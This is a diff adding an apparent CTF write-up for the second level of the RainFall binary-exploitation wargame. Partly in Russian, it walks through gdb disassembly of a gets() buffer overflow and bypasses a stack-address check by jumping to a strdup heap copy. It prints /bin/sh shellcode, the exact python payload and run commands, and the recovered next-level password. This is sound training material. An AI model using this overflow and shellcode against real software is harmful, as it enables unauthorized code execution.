@@ -1,0 +1,92 @@
+Let's see what we have?
+
+level2@RainFall:~$ ls -la
+
+We have one binary file level2 from user level3
+Let's see what it contains?
+
+gdb ./level2
+(gdb) disas main
+    Dump of assembler code for function main:
+       0x0804853f <+0>: push   %ebp
+       0x08048540 <+1>: mov    %esp,%ebp
+       0x08048542 <+3>: and    $0xfffffff0,%esp
+       0x08048545 <+6>: call   0x80484d4 <p> 
+       0x0804854a <+11>:    leave  
+       0x0804854b <+12>:    ret    
+    End of assembler dump.
+
+We see interesting function <p>. Let's see what it is.
+
+(gdb) disas p
+    Dump of assembler code for function p:
+       0x080484d4 <+0>: push   %ebp
+       0x080484d5 <+1>: mov    %esp,%ebp
+       0x080484d7 <+3>: sub    $0x68,%esp
+       0x080484da <+6>: mov    0x8049860,%eax
+       0x080484df <+11>:    mov    %eax,(%esp)
+       0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
+       0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
+       0x080484ea <+22>:    mov    %eax,(%esp)
+       0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+       0x080484f2 <+30>:    mov    0x4(%ebp),%eax
+       0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
+       0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
+       0x080484fb <+39>:    and    $0xb0000000,%eax 
+       0x08048500 <+44>:    cmp    $0xb0000000,%eax 
+       0x08048505 <+49>:    jne    0x8048527 <p+83>
+       0x08048507 <+51>:    mov    $0x8048620,%eax
+       0x0804850c <+56>:    mov    -0xc(%ebp),%edx
+       0x0804850f <+59>:    mov    %edx,0x4(%esp)
+       0x08048513 <+63>:    mov    %eax,(%esp)
+       0x08048516 <+66>:    call   0x80483a0 <printf@plt>
+       0x0804851b <+71>:    movl   $0x1,(%esp)
+       0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
+       0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
+       0x0804852a <+86>:    mov    %eax,(%esp)
+       0x0804852d <+89>:    call   0x80483f0 <puts@plt>
+       0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
+       0x08048535 <+97>:    mov    %eax,(%esp)
+       0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+       0x0804853d <+105>:   leave  
+       0x0804853e <+106>:   ret    
+    End of assembler dump.
+
+On the 30th string we take the return address and put it on stack.
+On the 39th and 40th string we compare the return address with mask of stack addressses.
+Thus we cant replace the return address of <p> as in the previous level
+
+But we want to run shell code from user level3
+Let's put shel code into кучу using <strdup>
+
+Let's find return adress of <strdup>:
+
+ltrace ./level2 
+    __libc_start_main(0x804853f, 1, 0xbffff6e4, 0x8048550, 0x80485c0 <unfinished ...>
+    fflush(0xb7fd1a20)                                                   = 0
+    gets(0xbffff5ec, 0, 0, 0xb7e5ec73, 0x80482b511111
+    )                        = 0xbffff5ec
+    puts("11111"11111
+    )                                                        = 6
+    strdup("11111")                                                      = 0x0804a008
+    +++ exited (status 8) +++
+
+Ok, now let's generate shell code
+
+To create shell code: http://shell-storm.org/shellcode/files/shellcode-811.php
+This is it: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
+with length 28
+
+Generate whole argument of such format: (28 символов shell кода | 52 символа нагрузки | адрес возврата strdup)
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "a"*52 + "\x08\xa0\x04\x08"' > /tmp/level2
+
+And run <level2> with it
+
+cat /tmp/level2 - | ./level2
+cat /home/user/level3/.pass
+    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+CTRL + D
+
+su level3
+Password:
